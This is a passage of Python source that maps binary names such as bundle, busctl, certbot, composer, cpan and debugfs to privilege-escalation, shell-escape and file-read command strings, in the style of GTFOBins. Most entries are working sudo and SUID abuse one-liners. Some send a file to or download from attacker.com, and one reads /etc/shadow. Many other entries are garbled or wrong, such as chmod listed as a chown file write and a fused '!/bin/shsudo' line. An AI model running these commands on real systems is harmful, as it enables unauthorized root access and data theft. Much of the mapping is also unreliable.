    elif gtfo_command == "bridge":
        if gtfo_options == "sudo":
            bins.append(r"LFILE=file_to_read\nsudo bridge -b ""$LFILE""")
        elif gtfo_options == "suid":
            bins.append(r"LFILE=file_to_read\n./bridge -b ""$LFILE""")
        elif gtfo_options == "file-read":
            bins.append(r"LFILE=file_to_read\nbridge -b ""$LFILE""")
        elif gtfo_options == "file-write":
            bins.append(r"sudo brctl addbr br0\nsudo brctl addif br0 eth0")
        elif gtfo_options == "shell":
            bins.append("username ALL=(ALL) NOPASSWD: /usr/sbin/bridge")

    elif gtfo_command == "bundle":
        if gtfo_options == "shell":
            bins.append(r"bundle help\n!/bin/sh")
        elif gtfo_options == "sudo":
            bins.append(r"sudo bundle help\n!/bin/sh")
        elif gtfo_options == "file-write":
            bins.append(r"TF=$(mktemp -d)\ntouch $TF/Gemfile\ncd $TF\nbundle exec /bin/sh")
        elif gtfo_options == "suid":
            bins.append(r"export BUNDLE_GEMFILE=x\nbundle exec /bin/sh")
        elif gtfo_options == "file-read":
            bins.append(r"TF=$(mktemp -d)\necho 'system(""/bin/sh"")' > $TF/Gemfile\ncd $TF\nbundle install")

    elif gtfo_command == "bundler":
        if gtfo_options == "sudo":
            bins.append(r"sudo bundler help\n!/bin/sh")
        elif gtfo_options == "shell":
            bins.append(r"bundler help\n!/bin/sh")
        elif gtfo_options == "suid":
            bins.append(r"export BUNDLE_GEMFILE=x\nbundler exec /bin/sh")
        elif gtfo_options == "file-read":
            bins.append(r"TF=$(mktemp -d)\necho 'system(""/bin/sh"")' > $TF/Gemfile\ncd $TF\nbundler install")
        elif gtfo_options == "file-write":
            bins.append(r"TF=$(mktemp -d)\ntouch $TF/Gemfile\ncd $TF\nbundler exec /bin/sh")

    elif gtfo_command == "busctl":
        if gtfo_options == "shell":
            bins.append(r"busctl --show-machine\n!/bin/sh")
        elif gtfo_options == "sudo":
            bins.append("sudo busctl set-property org.freedesktop.systemd1 /org/freedesktop/systemd1 org.freedesktop.systemd1.Manager LogLevel s debug --address=unixexec:path=/bin/sh,argv1=-c,argv2='/bin/sh -i 0<&2 1>&2'")
        elif gtfo_options == "suid":
            bins.append(r"busctl --show-machine\n!/bin/shsudo install -m =xs $(which busctl) .\n./busctl set-property org.freedesktop.systemd1 /org/freedesktop/systemd1 org.freedesktop.systemd1.Manager LogLevel s debug --address=unixexec:path=/bin/sh,argv1=-pc,argv2='/bin/sh -p -i 0<&2 1>&2'")
        elif gtfo_options == "file-write":
            bins.append("busctl --user call org.freedesktop.systemd1 /org/freedesktop/systemd1 org.freedesktop.systemd1.Manager StartUnit s ""your-service.service"" ""replace""")
        elif gtfo_options == "file-read":
            bins.append("busctl --user call <service-name> <object-path> <interface-name> <method-name> s ""path/to/your/file.txt""")

    elif gtfo_command == "byebug":
        if gtfo_options == "shell":
            bins.append(r"TF=$(mktemp)\necho 'system(""/bin/sh"")' > $TF\nbyebug $TF\ncontinue")
        elif gtfo_options == "suid":
            bins.append(r"TF=$(mktemp)\necho 'system(""/bin/sh"")' > $TF\n./byebug $TF\ncontinue")
        elif gtfo_options == "sudo":
            bins.append(r"TF=$(mktemp)\necho 'system(""/bin/sh"")' > $TF\nsudo byebug $TF\ncontinue")
        elif gtfo_options == "file-read":
            bins.append("ruby -r 'byebug' read_file.rb")
        elif gtfo_options == "file-write":
            bins.append("ruby -r 'byebug' write_to_file.rb")

    elif gtfo_command == "bzip2":
        if gtfo_options == "sudo":
            bins.append(r"LFILE=file_to_read\nsudo bzip2 -c $LFILE | bzip2 -d")
        elif gtfo_options == "suid":
            bins.append(r"sudo install -m =xs $(which bzip2) .\nLFILE=file_to_read\n./bzip2 -c $LFILE | bzip2 -d")
        elif gtfo_options == "file-read":
            bins.append(r"LFILE=file_to_read\nbzip2 -c $LFILE | bzip2 -d")
        elif gtfo_options == "file-write":
            bins.append("tar -cvjf malicious.tar.bz2 reverse_shell.sh")
        elif gtfo_options == "shell":
            bins.append(r"tar -cvf malicious.tar reverse_shell.sh\nbzip2 malicious.tar")

    elif gtfo_command == "c89":
        if gtfo_options == "shell":
            bins.append("c89 -wrapper /bin/sh,-s .")
        elif gtfo_options == "sudo":
            bins.append("sudo c89 -wrapper /bin/sh,-s .")
        elif gtfo_options == "file-read":
            bins.append(r"LFILE=file_to_read\nc89 -x c -E ""$LFILE""")
        elif gtfo_options == "file-write":
            bins.append(r"LFILE=file_to_delete\nc89 -xc /dev/null -o $LFILE")
        elif gtfo_options == "suid":
            bins.append(r"sudo install -m =xs $(which c89) .\nc89 -wrapper /bin/sh,-s .")

    elif gtfo_command == "c99":
        if gtfo_options == "shell":
            bins.append("c99 -wrapper /bin/sh,-s .")
        elif gtfo_options == "sudo":
            bins.append("sudo c99 -wrapper /bin/sh,-s .")
        elif gtfo_options == "file-read":
            bins.append(r"LFILE=file_to_read\nc99 -x c -E ""$LFILE""")
        elif gtfo_options == "file-write":
            bins.append(r"LFILE=file_to_delete\nc99 -xc /dev/null -o $LFILE")
        elif gtfo_options == "suid":
            bins.append(r"sudo install -m =xs $(which c99) .\nc99 -wrapper /bin/sh,-s .")

    elif gtfo_command == "cabal":
        if gtfo_options == "shell":
            bins.append("cabal exec -- /bin/sh")
        elif gtfo_options == "sudo":
            bins.append("sudo cabal exec -- /bin/sh")
        elif gtfo_options == "suid":
            bins.append(r"sudo install -m =xs $(which cabal) .\n./cabal exec -- /bin/sh -p")
        elif gtfo_options == "file-write":
            bins.append("cabal build")
        elif gtfo_options == "file-read":
            bins.append(r"cabal build\ncabal run")

    elif gtfo_command == "cancel":
        if gtfo_options == "file-write":
            bins.append(r"RHOST=attacker.com\nRPORT=12345\nLFILE=file_to_send\ncancel -u ""$(cat $LFILE)"" -h $RHOST:$RPORT")
        elif gtfo_options == "file-read":
            bins.append("Not available")
        elif gtfo_options == "shell":
            bins.append("Not available")
        elif gtfo_options == "suid":
            bins.append("Not available")
        elif gtfo_options == "sudo":
            bins.append("Not available")

    elif gtfo_command == "capsh":
        if gtfo_options == "shell":
            bins.append("capsh --")
        elif gtfo_options == "suid":
            bins.append(r"sudo install -m =xs $(which capsh) .\n./capsh --gid=0 --uid=0 --")
        elif gtfo_options == "sudo":
            bins.append("sudo capsh --")
        elif gtfo_options == "file-read":
            bins.append("sudo setcap cap_dac_read_search=eip /path/to/binary")
        elif gtfo_options == "file-write":
            bins.append("capsh --caps=""cap_dac_write=eip"" -- -c ""command_to_run""")

    elif gtfo_command == "cdist":
        if gtfo_options == "shell":
            bins.append("cdist shell -s /bin/sh")
        elif gtfo_options == "sudo":
            bins.append("sudo cdist shell -s /bin/sh")
        elif gtfo_options == "suid":
            bins.append("username ALL=(ALL) NOPASSWD: /usr/bin/cdist")
        elif gtfo_options == "file-read":
            bins.append("setcap cap_dac_read_search=eip /usr/bin/cdist")
        elif gtfo_options == "file-write":
            bins.append("getcap /usr/bin/cdist")

    elif gtfo_command == "certbot":
        if gtfo_options == "shell":
            bins.append(r"TF=$(mktemp -d)\ncertbot certonly -n -d x --standalone --dry-run --agree-tos --email x --logs-dir $TF --work-dir $TF --config-dir $TF --pre-hook '/bin/sh 1>&0 2>&0'")
        elif gtfo_options == "sudo":
            bins.append(r"TF=$(mktemp -d)\nsudo certbot certonly -n -d x --standalone --dry-run --agree-tos --email x --logs-dir $TF --work-dir $TF --config-dir $TF --pre-hook '/bin/sh 1>&0 2>&0'")
        elif gtfo_options == "suid":
            bins.append(r"sudo install -m =xs $(which certbot) .\nTF=$(mktemp -d)\ncertbot certonly -n -d x --standalone --dry-run --agree-tos --email x --logs-dir $TF --work-dir $TF --config-dir $TF --pre-hook '/bin/sh 1>&0 2>&0'")
        elif gtfo_options == "file-write":
            bins.append("sudo certbot renew")
        elif gtfo_options == "file-read":
            bins.append("sudo -u certbot-user certbot renew --dry-run")
    
    elif gtfo_command == "check_by_ssh":
        if gtfo_options == "shell":
            bins.append("check_by_ssh -o ""ProxyCommand /bin/sh -i <$(tty) |& tee $(tty)"" -H localhost -C xx")
        elif gtfo_options == "sudo":
            bins.append("sudo check_by_ssh -o ""ProxyCommand /bin/sh -i <$(tty) |& tee $(tty)"" -H localhost -C xx")
        elif gtfo_options == "suid":
            bins.append(r"sudo install -m =xs $(which check_by_ssh) .\ncheck_by_ssh -o ""ProxyCommand /bin/sh -i <$(tty) |& tee $(tty)"" -H localhost -C xx")
        elif gtfo_options == "file-write":
            bins.append("echo ""Test message"" >> /var/log/nagios/check_by_ssh.log")
        elif gtfo_options == "file-read":
            bins.append("cat ""FILE"" /var/log/nagios/check_by_ssh.log")

    elif gtfo_command == "check_cups":
        if gtfo_options == "sudo":
            bins.append(r"LFILE=file_to_read\nsudo check_cups --extra-opts=@$LFILE")
        elif gtfo_options == "file-read":
            bins.append(r"LFILE=file_to_read\ncheck_cups --extra-opts=@$LFILE")
        elif gtfo_options == "file-write":
            bins.append(r"LFILE=file_to_write\ncheck_cups --extra-opts=@$LFILE")
        elif gtfo_options == "suid":
            bins.append(r"sudo install -m =xs $(which check_cups) .\nLFILE=file_to_read\ncheck_cups --extra-opts=@$LFILE")
        elif gtfo_options == "shell":
            bins.append(r"echo ""check_cups -H localhost -p 9100"" > rvshell.sh\nbash")

    elif gtfo_command == "check_log":
        if gtfo_options == "sudo":
            bins.append(r"LFILE=file_to_write\nINPUT=input_file\nsudo check_log -F $INPUT -O $LFILE")
        elif gtfo_options == "file-read":
            bins.append(r"LFILE=file_to_read\nOUTPUT=output_file\ncheck_log -F $LFILE -O $OUTPUT\ncat $OUTPUT")
        elif gtfo_options == "file-write":
            bins.append(r"LFILE=file_to_write\nINPUT=input_file\ncheck_log -F $INPUT -O $LFILE")
        elif gtfo_options == "suid":
            bins.append(r"sudo install -m =xs $(which check_log) .\nLFILE=file_to_write\nINPUT=input_file\nsudo check_log -F $INPUT -O $LFILE")
        elif gtfo_options == "shell":
            bins.append(r"/usr/local/nagios/libexec/check_log -f /var/log/syslog -q ""error"" -w 10 -c 20\nbash")

    elif gtfo_command == "check_memory":
        if gtfo_options == "sudo":
            bins.append(r"LFILE=file_to_read\nsudo check_memory --extra-opts=@$LFILE")
        elif gtfo_options == "file-read":
            bins.append(r"LFILE=file_to_read\ncheck_memory --extra-opts=@$LFILE")
        elif gtfo_options == "file-write":
            bins.append(r"LFILE=file_to_write\ncheck_memory --extra-opts=@$LFILE")
        elif gtfo_options == "shell":
            bins.append(r"/usr/local/nagios/libexec/check_memory -w 80 -c 90\nbash")
        elif gtfo_options == "suid":
            bins.append("sudo install -m =xs $(which check_memory) .")

    elif gtfo_command == "check_raid":
        if gtfo_options == "sudo":
            bins.append(r"LFILE=file_to_read\nsudo check_raid --extra-opts=@$LFILE")
        elif gtfo_options == "file-read":
            bins.append(r"LFILE=file_to_read\ncheck_raid --extra-opts=@$LFILE")
        elif gtfo_options == "file-write":
            bins.append(r"LFILE=file_to_write\ncheck_raid --extra-opts=@$LFILE")
        elif gtfo_options == "suid":
            bins.append(r"sudo install -m =xs $(which check_raid) .\nLFILE=file_to_read\ncheck_raid --extra-opts=@$LFILE")
        elif gtfo_options == "shell":
            bins.append(r"/usr/local/nagios/libexec/check_raid -w 80 -c 90\nbash")

    elif gtfo_command == "check_ssl_cert":
        if gtfo_options == "sudo":
            bins.append(r"COMMAND=id\nOUTPUT=output_file\nTF=$(mktemp)\necho ""$COMMAND | tee $OUTPUT"" > $TF\nchmod +x $TF\numask 022\ncheck_ssl_cert --curl-bin $TF -H example.net\ncat $OUTPUT")
        elif gtfo_options == "file-read":
            bins.append(r"COMMAND=id\nOUTPUT=output_file\nTF=$(mktemp)\necho ""$COMMAND | tee $OUTPUT"" > $TF\nchmod +x $TF\ncheck_ssl_cert --curl-bin $TF -H example.net\ncat $OUTPUT")
        elif gtfo_options == "file-write":
            bins.append(r"COMMAND=id\nOUTPUT=output_file\nTF=$(mktemp)\necho ""$COMMAND | tee $OUTPUT"" > $TF\nchmod +x $TF\ncheck_ssl_cert --curl-bin $TF -H example.net\n./$OUTPUT")
        elif gtfo_options == "suid":
            bins.append(r"sudo install -m =xs $(which check_ssl_cert) .\nCOMMAND=id\nOUTPUT=output_file\nTF=$(mktemp)\necho ""$COMMAND | tee $OUTPUT"" > $TF\nchmod +x $TF\ncheck_ssl_cert --curl-bin $TF -H example.net\ncat $OUTPUT")
        elif gtfo_options == "shell":
            bins.append(r"/usr/local/nagios/libexec/check_ssl_cert -H example.com -w 30 -c 15\nbash")

    elif gtfo_command == "check_statusfile":
        if gtfo_options == "sudo":
            bins.append(r"LFILE=file_to_read\nsudo check_statusfile $LFILE")
        elif gtfo_options == "file-read":
            bins.append(r"LFILE=file_to_read\ncheck_statusfile $LFILE")
        elif gtfo_options == "file-write":
            bins.append(r"LFILE=file_to_write\ncheck_statusfile $LFILE")
        elif gtfo_options == "suid":
            bins.append(r"sudo install -m =xs $(which check_statusfile) .\nLFILE=file_to_read\ncheck_statusfile $LFILE")
        elif gtfo_options == "shell":
            bins.append(r"/usr/local/nagios/libexec/check_statusfile -H example.com -w 30 -c 15\nbash")

    elif gtfo_command == "choom":
        if gtfo_options == "sudo":
            bins.append("sudo choom -n 0 /bin/sh")
        elif gtfo_options == "suid":
            bins.append(r"sudo install -m =xs $(which choom) .\n./choom -n 0 -- /bin/sh -p")
        elif gtfo_options == "shell":
            bins.append("choom -n 0 /bin/sh")
        elif gtfo_options == "file-read":
            bins.append(r"choom -p <pid> --set <priority_level>\n cat FILE")
        elif gtfo_options == "file-write":
            bins.append(r"choom -p <pid> --set <priority_level>\n echo 'text' > FILE")

    elif gtfo_command == "chown":
        if gtfo_options == "sudo":
            bins.append(r"LFILE=file_to_change\nsudo chown $(id -un):$(id -gn) $LFILE")
        elif gtfo_options == "suid":
            bins.append(r"LFILE=file_to_change\n./chown $(id -un):$(id -gn) $LFILE")
        elif gtfo_options == "file-read":
            bins.append("chown user:group file.txt")
        elif gtfo_options == "file-write":
            bins.append("chmod u=rw,g=r,o= file.txt")
        elif gtfo_options == "shell":
            bins.append("bash -c ""chown user:group /path/to/file && exec bash""")

    elif gtfo_command == "chroot":
        if gtfo_options == "sudo":
            bins.append("sudo chroot /")
        elif gtfo_options == "suid":
            bins.append(r"sudo install -m =xs $(which chroot) .\n./chroot / /bin/sh -p")
        elif gtfo_options == "file-read":
            bins.append(r"mkdir /newroot\ncp /bin/bash /newroot/bin/\ncp /lib/x86_64-linux-gnu/libc.so.6 /newroot/lib/x86_64-linux-gnu/\nchroot /newroot /bin/bash")
        elif gtfo_options == "file-write":
            bins.append(r"mkdir -p /newroot/var/log\ntouch /newroot/var/log/mylogfile.log\nchmod 666 /newroot/var/log/mylogfile.log\nchroot /newroot /bin/bash\necho ""Log entry at $(date)"" >> /var/log/mylogfile.log")
        elif gtfo_options == "shell":
            bins.append("chroot <new_root_directory> /bin/bash")

    elif gtfo_command == "clamscan":
        if gtfo_options == "sudo":
            bins.append(r"LFILE=file_to_read\nTF=$(mktemp -d)\ntouch $TF/empty.yara\nsudo clamscan --no-summary -d $TF -f $LFILE 2>&1 | sed -nE 's/^(.*): No such file or directory$/\1/p'")
        elif gtfo_options == "suid":
            bins.append(r"sudo install -m =xs $(which clamscan) .\nLFILE=file_to_read\nTF=$(mktemp -d)\ntouch $TF/empty.yara\n./clamscan --no-summary -d $TF -f $LFILE 2>&1 | sed -nE 's/^(.*): No such file or directory$/\1/p'")
        elif gtfo_options == "file-read":
            bins.append(r"LFILE=file_to_read\nTF=$(mktemp -d)\ntouch $TF/empty.yara\nclamscan --no-summary -d $TF -f $LFILE 2>&1 | sed -nE 's/^(.*): No such file or directory$/\1/p'")
        elif gtfo_options == "file-write":
            bins.append(r"LFILE=file_to_write\nTF=$(mktemp -d)\ntouch $TF/empty.yara\nclamscan --no-summary -d $TF -f $LFILE 2>&1 | sed -nE 's/^(.*): No such file or directory$/\1/p'")
        elif gtfo_options == "shell":
            bins.append("clamscan -r /path/to/directory")

    elif gtfo_command == "cmp":
        if gtfo_options == "sudo":
            bins.append(r"LFILE=file_to_read\nsudo cmp $LFILE /dev/zero -b -l")
        elif gtfo_options == "suid":
            bins.append(r"sudo install -m =xs $(which cmp) .\nLFILE=file_to_read\n./cmp $LFILE /dev/zero -b -l")
        elif gtfo_options == "file-read":
            bins.append(r"LFILE=file_to_read\ncmp $LFILE /dev/zero -b -l")
        elif gtfo_options == "file-write":
            bins.append(r"LFILE=file_to_write\ncmp $LFILE /dev/zero -b -l")
        elif gtfo_options == "shell":
            bins.append(r"./compare_files.sh file1.txt file2.txt\ncmp -s file1.txt file2.txt")

    elif gtfo_command == "cobc":
        if gtfo_options == "shell":
            bins.append(r"TF=$(mktemp -d)\necho 'CALL ""SYSTEM"" USING ""/bin/sh"".' > $TF/x\ncobc -xFj --frelax-syntax-checks $TF/x")
        elif gtfo_options == "sudo":
            bins.append(r"TF=$(mktemp -d)\necho 'CALL ""SYSTEM"" USING ""/bin/sh"".' > $TF/x\nsudo cobc -xFj --frelax-syntax-checks $TF/x")
        elif gtfo_options == "suid":
            bins.append(r"sudo install -m =xs $(which cmp) .\nTF=$(mktemp -d)\necho 'CALL ""SYSTEM"" USING ""/bin/sh"".' > $TF/x\nsudo cobc -xFj --frelax-syntax-checks $TF/x")
        elif gtfo_options == "file-read":
            bins.append("cobc -x /path/to/file/fileread.cob")
        elif gtfo_options == "file-write":
            bins.append("cobc -x /path/to/file/fileread.cob")

    elif gtfo_command == "column":
        if gtfo_options == "sudo":
            bins.append(r"LFILE=file_to_read\nsudo column $LFILE")
        elif gtfo_options == "suid":
            bins.append(r"sudo install -m =xs $(which column) .\nLFILE=file_to_read\n./column $LFILE")
        elif gtfo_options == "file-read":
            bins.append(r"LFILE=file_to_read\ncolumn $LFILE")
        elif gtfo_options == "file-write":
            bins.append(r"LFILE=file_to_write\ncolumn $LFILE")
        elif gtfo_options == "shell":
            bins.append(r"LFILE=file_to_read\ncolumn /etc/shadow")

    elif gtfo_command == "comm":
        if gtfo_options == "sudo":
            bins.append(r"LFILE=file_to_read\nsudo comm $LFILE /dev/null 2>/dev/null")
        elif gtfo_options == "suid":
            bins.append(r"sudo install -m =xs $(which comm) .\nLFILE=file_to_read\ncomm $LFILE /dev/null 2>/dev/null")
        elif gtfo_options == "file-read":
            bins.append(r"LFILE=file_to_read\ncomm $LFILE /dev/null 2>/dev/null")
        elif gtfo_options == "file-write":
            bins.append(r"LFILE=file_to_write\ncomm $LFILE /dev/null 2>/dev/null")
        elif gtfo_options == "shell":
            bins.append("comm <(sort file1.txt) <(sort file2.txt)")

    elif gtfo_command == "composer":
        if gtfo_options == "shell":
            bins.append(r"TF=$(mktemp -d)\necho '{""scripts"":{""x"":""/bin/sh -i 0<&3 1>&3 2>&3""}}' >$TF/composer.json\ncomposer --working-dir=$TF run-script x")
        elif gtfo_options == "sudo":
            bins.append(r"TF=$(mktemp -d)\necho '{""scripts"":{""x"":""/bin/sh -i 0<&3 1>&3 2>&3""}}' >$TF/composer.json\nsudo composer --working-dir=$TF run-script x")
        elif gtfo_options == "suid":
            bins.append(r"sudo install -m =xs $(which composer) .\nTF=$(mktemp -d)\necho '{""scripts"":{""x"":""/bin/sh -i 0<&3 1>&3 2>&3""}}' >$TF/composer.json\ncomposer --working-dir=$TF run-script x")
        elif gtfo_options == "file-read":
            bins.append(r"composer init\nphp file-reader.php")
        elif gtfo_options == "file-write":
            bins.append(r"composer init\nphp file-writer.php")

    elif gtfo_command == "cowsay":
        if gtfo_options == "shell":
            bins.append(r"TF=$(mktemp)\necho 'exec ""/bin/sh"";' >$TF\ncowsay -f $TF x")
        elif gtfo_options == "sudo":
            bins.append(r"TF=$(mktemp)\necho 'exec ""/bin/sh"";' >$TF\nsudo cowsay -f $TF x")
        elif gtfo_options == "suid":
            bins.append(r"sudo install -m =xs $(which cowsay) .\nTF=$(mktemp)\necho 'exec ""/bin/sh"";' >$TF\nsudo cowsay -f $TF x")
        elif gtfo_options == "file-read":
            bins.append("cat filename | cowsay")
        elif gtfo_options == "file-write":
            bins.append("cowsay ""Your message here"" > output.txt")

    elif gtfo_command == "cowthink":
        if gtfo_options == "shell":
            bins.append(r"TF=$(mktemp)\necho 'exec ""/bin/sh"";' >$TF\ncowthink -f $TF x")
        elif gtfo_options == "sudo":
            bins.append(r"TF=$(mktemp)\necho 'exec ""/bin/sh"";' >$TF\nsudo cowthink -f $TF x")
        elif gtfo_options == "suid":
            bins.append(r"sudo install -m =xs $(which cowthink) .\nTF=$(mktemp)\necho 'exec ""/bin/sh"";' >$TF\nsudo cowthink -f $TF x")
        elif gtfo_options == "file-read":
            bins.append("cat filename | cowthink")
        elif gtfo_options == "file-write":
            bins.append("cowthink ""Your message here"" > output.txt")

    elif gtfo_command == "cpan":
        if gtfo_options == "sudo":
            bins.append(r"sudo cpan\n! exec '/bin/bash'")
        elif gtfo_options == "suid":
            bins.append(r"sudo install -m =xs $(which cpan) .\nsudo cpan\n! exec '/bin/bash'")
        elif gtfo_options == "file-read":
            bins.append(r"export URL=http://attacker.com/file_to_get\ncpan\n! use File::Fetch; my $file = (File::Fetch->new(uri => ""$ENV{URL}""))->fetch();")
        elif gtfo_options == "file-write":
            bins.append(r"cpan\n! use HTTP::Server::Simple; my $server= HTTP::Server::Simple->new(); $server->run();")
        elif gtfo_options == "shell":
            bins.append(r"cpan\n! exec '/bin/bash'")

    elif gtfo_command == "cpio":
        if gtfo_options == "sudo":
            bins.append(r"echo '/bin/sh </dev/tty >/dev/tty' >localhost\nsudo cpio -o --rsh-command /bin/sh -F localhost:")
        elif gtfo_options == "shell":
            bins.append(r"echo '/bin/sh </dev/tty >/dev/tty' >localhost\ncpio -o --rsh-command /bin/sh -F localhost:")
        elif gtfo_options == "file-read":
            bins.append(r"LFILE=file_to_read\necho ""$LFILE"" | cpio -o")
        elif gtfo_options == "file-write":
            bins.append(r"LFILE=file_to_write\nLDIR=where_to_write\necho DATA >$LFILE\necho $LFILE | cpio -up $LDIR")
        elif gtfo_options == "suid":
            bins.append(r"sudo install -m =xs $(which cpio) .\nLFILE=file_to_read\nTF=$(mktemp -d)\necho ""$LFILE"" | ./cpio -R $UID -dp $TF\ncat ""$TF/$LFILE""")

    elif gtfo_command == "cpulimit":
        if gtfo_options == "sudo":
            bins.append("sudo cpulimit -l 100 -f /bin/sh")
        elif gtfo_options == "suid":
            bins.append(r"sudo install -m =xs $(which cpulimit) .\n./cpulimit -l 100 -f -- /bin/sh -p")
        elif gtfo_options == "file-read":
            bins.append("cpulimit -l 50 -e cat input.txt")
        elif gtfo_options == "file-write":
            bins.append("cpulimit -l 50 -e echo ""This is some text"" > output.txt")
        elif gtfo_options == "shell":
            bins.append("cpulimit -l 100 -f /bin/sh")

    elif gtfo_command == "crash":
        if gtfo_options == "sudo":
            bins.append(r"sudo crash -h\n!sh")
        elif gtfo_options == "suid":
            bins.append(r"sudo install -m =xs $(which crash) .\ncrash -h\n!sh")
        elif gtfo_options == "shell":
            bins.append(r"crash -h\n!sh")
        elif gtfo_options == "file-read":
            bins.append("crash /path/to/vmcore /path/to/vmlinux")
        elif gtfo_options == "file-write":
            bins.append("crash> kmem -s 0x1000 > kernel_memory_dump.txt")

    elif gtfo_command == "crontab":
        if gtfo_options == "sudo":
            bins.append("sudo crontab -e")
        elif gtfo_options == "suid":
            bins.append(r"sudo install -m =xs $(which crontab) .\ncrontab -e")
        elif gtfo_options == "file-read":
            bins.append("0 5 * * * cat /path/to/your/file.txt >> /path/to/logfile.log")
        elif gtfo_options == "file-write":
            bins.append("0 5 * * * echo ""Hello, World!"" > /path/to/output.txt")
        elif gtfo_options == "shell":
            bins.append("* * * * * /bin/bash -c 'echo ""Hello from the shell""")

    elif gtfo_command == "csh":
        if gtfo_options == "shell":
            bins.append("csh")
        elif gtfo_options == "sudo":
            bins.append("sudo csh")
        elif gtfo_options == "suid":
            bins.append(r"sudo install -m =xs $(which csh) .\n./csh -b")
        elif gtfo_options == "file-write":
            bins.append(r"export LFILE=file_to_write\nash -c 'echo DATA > $LFILE'")
        elif gtfo_options == "file-read":
            bins.append(r"export LFILE=file_to_read\nash -c 'cat DATA > $LFILE'")

    elif gtfo_command == "csplit":
        if gtfo_options == "sudo":
            bins.append(r"LFILE=file_to_read\ncsplit $LFILE 1\ncat xx01")
        elif gtfo_options == "file-write":
            bins.append(r"TF=$(mktemp)\necho ""DATA"" > $TF\nLFILE=file_to_write\ncsplit -z -b ""%d$LFILE"" $TF 1")
        elif gtfo_options == "file-read":
            bins.append(r"LFILE=file_to_read\ncsplit $LFILE 1\ncat xx01")
        elif gtfo_options == "suid":
            bins.append(r"sudo install -m =xs $(which csplit) .\nLFILE=file_to_read\ncsplit $LFILE 1\ncat xx01")
        elif gtfo_options == "shell":
            bins.append("csplit input.txt 10 && /bin/bash")

    elif gtfo_command == "csvtool":
        if gtfo_options == "shell":
            bins.append("csvtool call '/bin/sh;false' /etc/passwd")
        elif gtfo_options == "sudo":
            bins.append("sudo csvtool call '/bin/sh;false' /etc/passwd")
        elif gtfo_options == "suid":
            bins.append(r"sudo install -m =xs $(which csvtool) .\nLFILE=file_to_read\n./csvtool trim t $LFILE")
        elif gtfo_options == "file-read":
            bins.append(r"LFILE=file_to_read\ncsvtool trim t $LFILE")
        elif gtfo_options == "file-write":
            bins.append(r"LFILE=file_to_write\nTF=$(mktemp)\necho DATA > $TF\ncsvtool trim t $TF -o $LFILE")

    elif gtfo_command == "cupsfilter":
        if gtfo_options == "sudo":
            bins.append(r"LFILE=file_to_read\nsudo cupsfilter -i application/octet-stream -m application/octet-stream $LFILE")
        elif gtfo_options == "suid":
            bins.append(r"sudo install -m =xs $(which cupsfilter) .\nLFILE=file_to_read\n./cupsfilter -i application/octet-stream -m application/octet-stream $LFILE")
        elif gtfo_options == "file-read":
            bins.append(r"FILE=file_to_read\ncupsfilter -i application/octet-stream -m application/octet-stream $LFILE")
        elif gtfo_options == "file-write":
            bins.append(r"FILE=file_to_write\ncupsfilter -i application/octet-stream -m application/octet-stream $LFILE")
        elif gtfo_options == "shell":
            bins.append("bash -c '[ -f ""$1"" ] && cupsfilter ""$1"" > ""${1%.*}.pdf"" && echo ""Conversion successful: ${1%.*}.pdf"" || echo ""Error: File not found!""' -- inputfile.txt")

    elif gtfo_command == "cut":
        if gtfo_options == "sudo":
            bins.append(r"LFILE=file_to_read\nsudo cut -d """" -f1 ""$LFILE""")
        elif gtfo_options == "suid":
            bins.append(r"sudo install -m =xs $(which cut) .\nLFILE=file_to_read\n./cut -d """" -f1 ""$LFILE""")
        elif gtfo_options == "file-read":
            bins.append(r"LFILE=file_to_read\ncut -d """" -f1 ""$LFILE""")
        elif gtfo_options == "file-write":
            bins.append(r"LFILE=file_to_write\ncut -d """" -f1 ""$LFILE""")
        elif gtfo_options == "shell":
            bins.append("cut -d ' ' -f 1 /etc/shells | head -n 1 | xargs -I {} sh -c '{}'")

    elif gtfo_command == "dash":
        if gtfo_options == "sudo":
            bins.append("sudo dash")
        elif gtfo_options == "shell":
            bins.append("dash")
        elif gtfo_options == "suid":
            bins.append(r"sudo install -m =xs $(which dash) .\n./dash -p")
        elif gtfo_options == "file-write":
            bins.append(r"export LFILE=file_to_write\ndash -c 'echo DATA > $LFILE'")
        elif gtfo_options == "file-read":
            bins.append(r"export LFILE=file_to_read\ndash -c 'cat DATA > $LFILE'")

    elif gtfo_command == "date":
        if gtfo_options == "sudo":
            bins.append(r"LFILE=file_to_read\nsudo date -f $LFILE")
        elif gtfo_options == "suid":
            bins.append(r"sudo install -m =xs $(which date) .\nLFILE=file_to_read\n./date -f $LFILE")
        elif gtfo_options == "file-read":
            bins.append(r"LFILE=file_to_read\ndate -f $LFILE")
        elif gtfo_options == "file-write":
            bins.append(r"LFILE=file_to_write\ndate -f $LFILE")
        elif gtfo_options == "shell":
            bins.append("$(date); bash")

    elif gtfo_command == "dc":
        if gtfo_options == "sudo":
            bins.append("sudo dc -e '!/bin/sh'")
        elif gtfo_options == "shell":
            bins.append("dc -e '!/bin/sh'")
        elif gtfo_options == "suid":
            bins.append(r"sudo install -m =xs $(which dc) .\n./dc -e '!/bin/sh'")
        elif gtfo_options == "file-read":
            bins.append("cat FILE.txt | dc")
        elif gtfo_options == "file-write":
            bins.append("echo ""SCRIPT"" | dc > script.txt")

    elif gtfo_command == "debugfs":
        if gtfo_options == "sudo":
            bins.append(r"sudo debugfs\n!/bin/sh")
        elif gtfo_options == "shell":
            bins.append(r"debugfs\n!/bin/sh")
        elif gtfo_options == "suid":
            bins.append(r"sudo install -m =xs $(which debugfs) .\n./debugfs\n!/bin/sh")
        elif gtfo_options == "file-read":
            bins.append("debugfs:  cat /path/to/file")
        elif gtfo_options == "file-write":
            bins.append("debugfs:  write /path/to/file")

    elif gtfo_command == "dialog":
        if gtfo_options == "sudo":
            bins.append(r"LFILE=file_to_read\nsudo dialog --textbox ""$LFILE"" 0 0")
        elif gtfo_options == "suid":
            bins.append(r"sudo install -m =xs $(which dialog) .\nLFILE=file_to_read\n./dialog --textbox ""$LFILE"" 0 0")
        elif gtfo_options == "file-read":
            bins.append(r"LFILE=file_to_read\ndialog --textbox ""$LFILE"" 0 0")
        elif gtfo_options == "file-write":
            bins.append(r"LFILE=file_to_write\ndialog --textbox ""$LFILE"" 0 0")
        elif gtfo_options == "shell":
